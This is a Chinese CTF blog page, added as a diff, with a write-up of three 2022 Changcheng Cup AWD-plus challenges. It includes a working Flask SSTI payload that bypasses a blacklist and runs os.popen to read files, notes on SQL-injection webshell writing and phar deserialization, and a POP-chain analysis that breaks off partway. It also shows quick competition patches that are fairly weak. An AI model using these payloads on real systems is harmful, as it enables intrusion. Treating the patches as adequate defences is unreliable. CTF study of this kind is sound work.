@@ -1,0 +1,2393 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="c1ay">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="c1ay">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="信息安全技术博客">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>2022长城杯awdplus · c1ay&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/naruto.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >c1ay&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2022长城杯awdplus</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>c1ay's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2022长城杯awdplus
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2022/09/29</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="2022长城杯awdplus"><a href="#2022长城杯awdplus" class="headerlink" title="2022长城杯awdplus"></a>2022长城杯awdplus</h1><h3 id="admin-page"><a href="#admin-page" class="headerlink" title="admin_page"></a>admin_page</h3><p>登录处用户名参数存在注入，直接写马读取flag即可</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/OozpemBYp7LL.png?imageslim" alt="mark"></p>
+<p><img src="http://pic.c1imber.top/blog/20220929/eFogPaMpYFrg.png?imageslim" alt="mark"></p>
+<p>防御，<code>addslashes</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$username = addslashes($_POST[<span class="string">'username'</span>]);</div><div class="line">$password = addslashes($_POST[<span class="string">'password'</span>]);</div></pre></td></tr></table></figure>
+<h3 id="numflask"><a href="#numflask" class="headerlink" title="numflask"></a>numflask</h3><p>flask ssti，但是题目没给源码，需要通过获取shell后得到源码提交修复补丁</p>
+<p>通过黑盒测试发现过滤了数字和.等字符</p>
+<p>bypass，寻找到os模块执行命令：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /name.php HTTP/<span class="number">1.1</span></div><div class="line">Host: eci<span class="number">-2</span>zei55fwivfq7zyfjddk.cloudeci1.ichunqiu.com:<span class="number">8888</span></div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.2</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">101.0</span><span class="number">.4951</span><span class="number">.54</span> Safari/<span class="number">537.36</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></div><div class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: <span class="number">410</span></div><div class="line">Origin: http://eci<span class="number">-2</span>zei55fwivfq7zyfjddk.cloudeci1.ichunqiu.com:<span class="number">8888</span></div><div class="line">Connection: closea</div><div class="line">Referer: http://eci<span class="number">-2</span>zei55fwivfq7zyfjddk.cloudeci1.ichunqiu.com:<span class="number">8888</span>/</div><div class="line">Upgrade-Insecure-Requests: <span class="number">1</span></div><div class="line"></div><div class="line">name=&#123;&#123;<span class="string">''</span>[<span class="string">"__class__"</span>][<span class="string">"__mro__"</span>][dict(a=a)|join|count][<span class="string">"__subclasses__"</span>]()[dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count][<span class="string">"__init__"</span>][<span class="string">"__glo"</span> <span class="string">"bals__"</span>][<span class="string">'os'</span>][<span class="string">'popen'</span>](<span class="string">'cat /app/app*'</span>)[<span class="string">'read'</span>]()&#125;&#125;</div></pre></td></tr></table></figure>
+<p>获取到flag和源码：</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/YXmBlnElnzze.png?imageslim" alt="mark"></p>
+<p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory, render_template_string</div><div class="line">app = Flask(__name__)</div><div class="line">blacklists = [<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>, <span class="string">"0"</span>, <span class="string">"lipsum"</span>, <span class="string">"."</span>, <span class="string">"global"</span>, <span class="string">"request"</span>, <span class="string">"config"</span>, <span class="string">"builtins"</span>, <span class="string">"%"</span>]</div><div class="line"><span class="meta">@app.route('/', methods=['POST', 'GET'])</span></div><div class="line"><span class="meta">@app.route('/index.php', methods=['POST', 'GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hello</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</div><div class="line"><span class="meta">@app.route('/name.php', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Name</span><span class="params">()</span>:</span></div><div class="line">    name = request.form[<span class="string">'name'</span>]</div><div class="line">    <span class="keyword">for</span> blacklist <span class="keyword">in</span> blacklists:</div><div class="line">        <span class="keyword">if</span> blacklist <span class="keyword">in</span> str(name).lower():</div><div class="line">            template = <span class="string">'&lt;h2&gt;Good Job %s!&lt;/h2&gt;'</span> % <span class="string">"nooo"</span></div><div class="line">            <span class="keyword">return</span> render_template_string(template)</div><div class="line">    template = <span class="string">'&lt;h2&gt;Good Job %s!&lt;/h2&gt;'</span> % name</div><div class="line">    <span class="keyword">return</span> render_template_string(template, name=name)</div><div class="line"><span class="meta">@app.route('/robots.txt')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">static_from_root</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> send_from_directory(app.static_folder, request.path[<span class="number">1</span>:])</div><div class="line"><span class="meta">@app.errorhandler(404)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">miss</span><span class="params">(e)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""" &lt;html&gt; &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt; &lt;body bgcolor="white"&gt; &lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; """</span>, <span class="number">404</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="string">"false"</span>, host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8888</span>)</div></pre></td></tr></table></figure>
+<p>防御，去除<code>{}</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, send_from_directory, render_template_string</div><div class="line">app = Flask(__name__)</div><div class="line">blacklists = [<span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>, <span class="string">"0"</span>, <span class="string">"lipsum"</span>, <span class="string">"."</span>, <span class="string">"global"</span>, <span class="string">"request"</span>, <span class="string">"config"</span>, <span class="string">"builtins"</span>, <span class="string">"%"</span>]</div><div class="line"><span class="meta">@app.route('/', methods=['POST', 'GET'])</span></div><div class="line"><span class="meta">@app.route('/index.php', methods=['POST', 'GET'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Hello</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</div><div class="line"><span class="meta">@app.route('/name.php', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Name</span><span class="params">()</span>:</span></div><div class="line">    name = request.form[<span class="string">'name'</span>].strip(<span class="string">"&#123;"</span>).strip(<span class="string">"&#125;"</span>)</div><div class="line">    <span class="keyword">for</span> blacklist <span class="keyword">in</span> blacklists:</div><div class="line">        <span class="keyword">if</span> blacklist <span class="keyword">in</span> str(name).lower():</div><div class="line">            template = <span class="string">'&lt;h2&gt;Good Job %s!&lt;/h2&gt;'</span> % <span class="string">"nooo"</span></div><div class="line">            <span class="keyword">return</span> render_template_string(template)</div><div class="line">    template = <span class="string">'&lt;h2&gt;Good Job %s!&lt;/h2&gt;'</span> % name</div><div class="line">    <span class="keyword">return</span> render_template_string(template, name=name)</div><div class="line"><span class="meta">@app.route('/robots.txt')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">static_from_root</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> send_from_directory(app.static_folder, request.path[<span class="number">1</span>:])</div><div class="line"><span class="meta">@app.errorhandler(404)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">miss</span><span class="params">(e)</span>:</span></div><div class="line">    <span class="keyword">return</span> <span class="string">""" &lt;html&gt; &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt; &lt;body bgcolor="white"&gt; &lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; """</span>, <span class="number">404</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="string">"false"</span>, host=<span class="string">'0.0.0.0'</span>, port=<span class="number">8888</span>)</div></pre></td></tr></table></figure>
+<h3 id="codeinlog"><a href="#codeinlog" class="headerlink" title="codeinlog"></a>codeinlog</h3><p>application/controllers/Upload.php</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/LwTHJIoaVYM8.png?imageslim" alt="mark"></p>
+<p>上传文件到application/cache/upload.log，读取并输出，所以这里看起来是安全的</p>
+<p>application/controllers/Welcome.php</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/3CGivvtsvtG0.png?imageslim" alt="mark"></p>
+<p>存在风险：可以传入phar触发反序列化</p>
+<p>漏洞修复：</p>
+<p>直接过滤<code>phar://</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    $file = <span class="keyword">$this</span>-&gt;input-&gt;get(<span class="string">'file'</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(stripos($file,<span class="string">"phar://"</span>)!==<span class="keyword">false</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($file)) &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;load-&gt;view(<span class="string">'welcome_message'</span>, <span class="keyword">array</span>(<span class="string">'content'</span>=&gt; file_get_contents($file)));</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;load-&gt;view(<span class="string">'upload_form'</span>, <span class="keyword">array</span>(<span class="string">'error'</span> =&gt; <span class="string">''</span>));</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>防御成功，拿到防御分值</p>
+<p>攻击分值现场队伍0解，赛后复现了一下</p>
+<p>pop链挖掘：</p>
+<p>全局搜索<code>__destruc</code>t起点，找到：</p>
+<p>vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php-&gt;CacheAdapter-&gt;__destruct</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/0UgCcq7ribmI.png?imageslim" alt="mark"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>;</div><div class="line">...</div><div class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheAdapter</span> <span class="keyword">implements</span> <span class="title">CacheItemPoolInterface</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;commit();</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>定位到：</p>
+<p>vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php-&gt;CacheAdapter-&gt;commit</p>
+<p><img src="http://pic.c1imber.top/blog/20220929/w2j9P4Boo2oN.png?imageslim" alt="mark"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>;</div><div class="line">...</div><div class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheAdapter</span> <span class="keyword">implements</span> <span class="title">CacheItemPoolInterface</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span><span class="params">()</span>: <span class="title">bool</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;deferredItems) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $now         = microtime(<span class="keyword">true</span>);</div><div class="line">        $itemsCount  = <span class="number">0</span>;</div><div class="line">        $byLifetime  = [];</div><div class="line">        $expiredKeys = [];</div><div class="line"></div><div class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;deferredItems <span class="keyword">as</span> $key =&gt; $item) &#123;</div><div class="line">            $lifetime = ($item-&gt;getExpiry() ?? $now) - $now;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> ($lifetime &lt; <span class="number">0</span>) &#123;</div><div class="line">                $expiredKeys[] = $key;</div><div class="line"></div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            ++$itemsCount;</div><div class="line">            $byLifetime[(int) $lifetime][$key] = $item-&gt;get();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">switch</span> (count($expiredKeys)) &#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                <span class="keyword">$this</span>-&gt;cache-&gt;delete(current($expiredKeys));</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">$this</span>-&gt;doDeleteMultiple($expiredKeys);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ($itemsCount === <span class="number">1</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache-&gt;save($key, $item-&gt;get(), (int) $lifetime);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $success = <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">foreach</span> ($byLifetime <span class="keyword">as</span> $lifetime =&gt; $values) &#123;</div><div class="line">            $success = <span class="keyword">$this</span>-&gt;doSaveMultiple($values, $lifetime) &amp;&amp; $success;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> $success;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
